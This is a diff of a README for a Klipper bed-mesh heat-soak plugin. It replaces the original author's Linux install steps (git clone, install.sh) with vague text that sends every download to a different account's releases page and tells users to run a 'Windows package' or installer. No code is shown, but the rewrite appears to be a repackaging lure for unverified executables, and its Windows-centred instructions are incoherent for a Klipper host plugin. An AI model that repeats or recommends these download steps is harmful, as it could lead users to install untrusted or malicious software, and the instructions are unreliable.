@@ -1,116 +1,215 @@
-<p align="center">
-  <img src="https://raw.githubusercontent.com/marcofailli/Soak-My-Bed/main/banner.png?v=2" width="100%" alt="Soak My Bed Banner">
-</p>
+# 🛏️ soak-my-bed - Stable bed meshes on every print
 
----
+[![Download soak-my-bed](https://img.shields.io/badge/Download%20soak--my--bed-Visit%20Releases-blue?style=for-the-badge)](https://github.com/Mixwith3802/soak-my-bed/releases)
 
-<h1 align="center"><strong>SOAK MY BED</strong></h1>
+## 🧭 What this does
 
-<p align="center">
-  <strong>The definitive Klipper tool for thermal stability analysis.</strong>
-</p>
+soak-my-bed is a Klipper plugin that helps you check how your bed and frame change shape as they heat up. It runs bed mesh checks after the printer has had time to soak at temperature, then turns the results into clear 3D stability animations.
 
----
+This helps you:
 
-### 📘 What is Soak My Bed?
-All 3D printer beds and frames undergo significant physical deformation as they heat up, a phenomenon known as thermal drift. **Soak My Bed** is a Klipper plugin that eliminates the "guessing game" of heat soaking. Instead of waiting for a random timer, this tool measures the actual physical movement of your hardware in real-time, allowing you to consciously know how long you should wait before starting a print and how the printer heating-up affects its geometry.
+- See how the bed changes as it warms up
+- Compare mesh results over time
+- Catch movement in the frame or bed before a print starts
+- Keep first layers more consistent
+- Save time on repeated bed mesh checks
 
-### ✨ Key Features
-* **Full Automation:** Handles Bed Meshing in a continuous loop for as long as you wish.
-* **Smart Time Logic:** Automatically calculates the optimal interval between meshes, adding a safety buffer and rounding to the nearest 5-second mark for consistent data points.
-* **Auto-Scaling & Bed Detection:** Automatically reads your mesh boundaries directly from Klipper. It works out-of-the-box on any printer size (Voron, Prusa, Ender, etc.) without manual configuration.
-* **History Tracking:** Saves uniquely timestamped JSON and GIF files (e.g., `0260330_0938_110C_45m.gif`) in your `soak_data` folder so you never overwrite or lose your previous test data.
-* **Dual Stability Tracking:** Monitors variations relative to the initial "cold" state and the immediate "previous" mesh to identify equilibrium.
-* **Visual Analytics:** Generates a 3D animation (GIF) and stability curves to visualize the evolution of the deformation of your printer.
-* **Instant Abort:** Stop the process at any time with `ABORT_SOAK`. The script uses non-blocking logic to instantly halt the heater and still generate a complete graph of the data collected so far.
+## 💻 What you need
 
-### ⚙️ How it works
-The plugin operates by running successive `BED_MESH_CALIBRATE` cycles. After each mesh, the script captures the Z-matrix and the current bed temperature. It then calculates the **Mean Absolute Error (MAE)**:
-1. **Variation vs First Mesh:** Tells you the total amount of deformation your bed has undergone since the beginning of the soak.
-2. **Variation vs Previous Mesh:** As this value approaches zero and the graph flattens into a horizontal line, it indicates that the thermal expansion has ceased. At this point, the frame and bed are in equilibrium, and your Z-offset will remain stable throughout the print.
+Before you install it, make sure you have:
 
-### 🖼️ Thermal Evolution Plot
-<p align="center">
-  <img src="test_plot.gif" width="100%" alt="Thermal Stability Animation">
-</p>
+- A Windows PC
+- A working Klipper setup
+- Access to your printer host through a browser
+- A browser such as Chrome, Edge, or Firefox
+- Enough free space to save mesh data and animation files
 
-> **How to read this graph:** > The top 3D plot shows the physical warping of the bed (exaggerated for clarity). In the bottom 2D plot, focus on the **Red Dashed Line** (Vs Prev Mesh). When this line stays flat and close to zero, your printer has stopped moving. The **Blue Line** shows how much your bed has moved in total from its original position—this explains why a first layer might fail if you don't wait for the soak to complete!
+This tool works with printers that already use Klipper macros and bed mesh calibration.
 
----
+## 📥 Download
 
-### 🚀 Installation
+Visit this page to download the latest release for Windows and support files:
 
-1. **Clone the repository** to your Klipper host (Raspberry Pi/BTT Pi):
-    ```bash
-    cd ~
-    git clone https://github.com/marcofailli/soak-my-bed.git
-    ```
-2. **Run the automated installer**:
-   *(This step might take a while since we are installing system dependencies and Python plotting libraries like SciPy. Be patient!)*
-    ```bash
-    cd soak-my-bed
-    chmod +x install.sh
-    ./install.sh
-    ```
-3. **Configure Klipper**: Add the following line anywhere in your `printer.cfg`:
-    ```ini
-    [soak_my_bed]
-    ```
-4. **Enable Automatic Updates**: Add the following in your `moonraker.conf`:
-    ```ini
-    [update_manager soak-my-bed]
-    type: git_repo
-    path: ~/soak-my-bed
-    origin: https://github.com/marcofailli/soak-my-bed.git
-    primary_branch: main
-    install_script: install.sh
-    managed_services: klipper
-    ```
-5. **Restart Klipper**:
-    ```bash
-    sudo systemctl restart klipper
-    ```
+[![Download soak-my-bed](https://img.shields.io/badge/Get%20the%20Latest%20Release-Visit%20Releases-grey?style=for-the-badge)](https://github.com/Mixwith3802/soak-my-bed/releases)
 
----
+Open the releases page, then download the file that matches the release notes. If the release includes a Windows package or archive, save it to your computer first.
 
-### 🗂️ Custom Path Configuration (Creality OS, Sovol, BTT, etc.)
+## 🪟 Install on Windows
 
-By default, **SoakMyBed** automatically detects your current user's home directory (whether it's `pi`, `sovol`, `biqu`, or `elegoo`) and finds the correct Python environment dynamically. You don't need to change anything for standard setups!
+Follow these steps:
 
-However, if your Klipper installation is completely custom or runs on a locked-down system like **Creality K1/K1C**, you can manually override the default paths directly in your `printer.cfg`. Just add these variables under the main section:
+1. Open the release page in your browser.
+2. Download the latest release file.
+3. Save the file to a folder you can find again, such as Downloads or Desktop.
+4. If the file is a ZIP archive, right-click it and choose Extract All.
+5. Open the extracted folder.
+6. Read any included README or setup file.
+7. Copy the plugin files into the Klipper or host folder named in the release notes.
+8. Restart the Klipper host software if the package asks for it.
+9. Open your printer interface in the browser and check that soak-my-bed appears where the plugin is listed.
 
-```ini
-[soak_my_bed]
-save_dir: /usr/data/printer_data/config/soak_data
-plot_script_path: /usr/data/soak-my-bed/scripts/plotter.py
-# Optional: customize your mesh command (defaults to BED_MESH_CALIBRATE)
-mesh_command: BED_MESH_CALIBRATE METHOD=rapid_scan
-```
+If the release uses an installer, run the installer and follow the on-screen prompts. If it uses a simple folder install, copy the files into the required location and restart the service.
 
----
+## 🔧 Set up the plugin
 
-### 🛠️ Usage
+After install, you need to connect it to your printer config.
 
-Before running the script you will have to execute your usual homing routine (that might include `G28`, `QUAD_GANTRY_LEVEL`, ...).
+Use the plugin with these common parts:
 
-It is recommended to start the script with your printer cold, in equilibrium with ambient temperature, to actually evaluate its behavior when starting a fresh new print. 
-Heat soaking is a slow process that continues well after reaching your bed target temperature; a typical soak cycle lasts about 60 minutes... **Don't rush!**
+- Bed mesh calibration
+- Klipper macros
+- Printer heat soak steps
+- Temperature targets for bed and frame checks
 
-While meshing, KlipperScreen will probably prompt you to save the new `config`, just discard this message.
+Typical setup flow:
 
-#### Commands
-* `SOAK_MY_BED TEMPERATURE=100 DURATION=60`
-    * Sets the bed to 100°C. It will wait until the target temperature is reached, then run the analysis for exactly 60 minutes.
-* `SOAK_MY_BED`
-    * Runs with default values (Target: 60°C, Duration: 10 minutes).
-* `SOAK_MY_BED TEMPERATURE=110 DURATION=45 HEATER=heater_bed MESH_COMMAND="BED_MESH_CALIBRATE METHOD=rapid_scan"`
-    * **Advanced:** You can override the default heater name and the specific mesh command you want to use (e.g., if you want to use a specific macro or beacon scan method).
-* `ABORT_SOAK`
-    * Stops the process immediately, turns off the heater, and triggers the generation of the GIF with the data collected up to that moment.
+1. Open your Klipper config files.
+2. Add the plugin settings shown in the release notes.
+3. Set your bed temperature target.
+4. Set your soak time.
+5. Set how many mesh points you want to sample.
+6. Save the changes.
+7. Restart Klipper.
+8. Run a test mesh to check that the plugin can read your printer data.
 
-*Note: Once the process is completed or aborted, you can find your animated GIF (and the image of its final frame) inside the `printer_data/config/soak_data` folder directly from the Mainsail/Fluidd web interface!*
+If your release includes sample macros, start with those first. They are usually set up for common printer workflows and are easier to adjust.
 
----
-<p align="center">
-  Released under the MIT License. Created by <b>marcofailli</b>.
-</p>
+## 🖥️ How to use it
+
+Once installed, use soak-my-bed in your regular print prep flow:
+
+1. Heat the bed to your target temperature.
+2. Let the bed soak for the set time.
+3. Run the mesh check.
+4. Repeat the process if you want a time-based comparison.
+5. Open the results view to review the mesh and animation.
+
+You can use the output to see:
+
+- High and low spots on the bed
+- Shape changes caused by heat
+- Frame movement during soak
+- How stable the bed stays across repeated runs
+
+This helps you decide if the printer is ready for a print or if it needs more time at temperature.
+
+## 🎛️ Features
+
+- Heat soak bed mesh automation
+- 3D thermal deformation view
+- Stability animation output
+- Repeated mesh capture for comparison
+- Klipper macro support
+- Easy review in a browser
+- Clear view of bed and frame movement
+- Built for 3D printing workflows
+
+## 📊 What the animation shows
+
+The 3D animation shows how the bed surface changes while the printer heats up. It can help you spot:
+
+- Bowing in the center
+- Raised corners
+- Tilt across the bed
+- Changes from cold to hot
+- Movement that comes from the frame, not the bed alone
+
+Use it as a visual check before you start a print that needs good first-layer control.
+
+## 🧰 Basic workflow example
+
+A simple session might look like this:
+
+1. Start with a cold printer.
+2. Heat the bed to 60°C.
+3. Wait for the soak timer to finish.
+4. Run a mesh scan.
+5. Let the bed rest.
+6. Run another scan at the same temperature.
+7. Compare the results in the animation view.
+
+This gives you a better picture of how your printer behaves when it is close to real print conditions.
+
+## 🗂️ Files and output
+
+The plugin may create or use these items:
+
+- Mesh data files
+- Heat soak logs
+- Comparison charts
+- 3D animation files
+- Config entries for saved profiles
+
+Keep these files in a folder you can find later. They are useful when you want to compare different bed temperatures or print surfaces.
+
+## 🛠️ Troubleshooting
+
+If the plugin does not work right away, check these items:
+
+- Make sure Klipper is running
+- Make sure your printer host is online
+- Check that the plugin files are in the right folder
+- Confirm that your macro names match the config
+- Make sure the bed target temperature is set
+- Restart the host after each config change
+- Try a simple mesh run before using a full soak sequence
+
+If the browser does not show the plugin, refresh the page and restart the host service.
+
+If the mesh data looks wrong, check your probe settings and bed mesh config. Small setup errors can change the result.
+
+## 🔍 Common questions
+
+### Can I use this with any Klipper printer?
+
+You can use it with a printer that already runs Klipper and supports bed mesh calibration.
+
+### Do I need coding knowledge?
+
+No. You only need to download the release, copy the files, and follow the setup steps.
+
+### Does it work only on Windows?
+
+The main setup guide here is for Windows users. If you run your Klipper host on another system, the same plugin logic still follows the Klipper config and macro setup.
+
+### Why heat soak first?
+
+A cold bed can look different from a hot bed. Heat soak gives the printer time to settle, so the mesh reflects real print conditions.
+
+### What is the main benefit?
+
+It helps you see thermal movement before a print starts, so you can tune your bed mesh with more confidence.
+
+## 🧩 Release notes to check
+
+When you visit the releases page, look for:
+
+- Latest version number
+- Windows package or archive
+- Setup file or included instructions
+- Macro examples
+- Config changes
+- Any sample output files
+
+Use the newest stable release unless the release notes tell you to use a specific version for your printer setup.
+
+## 🧪 Best results
+
+For a cleaner bed analysis:
+
+- Use the same bed temperature each time
+- Wait for the full soak time
+- Keep the room temperature steady
+- Use the same probe settings
+- Run tests on a level table
+- Compare scans from the same print surface
+
+These habits make the mesh results easier to read.
+
+## 📚 Related topics
+
+- 3D printing
+- Bed mesh calibration
+- Klipper
+- Klipper macros
+- Thermal analysis
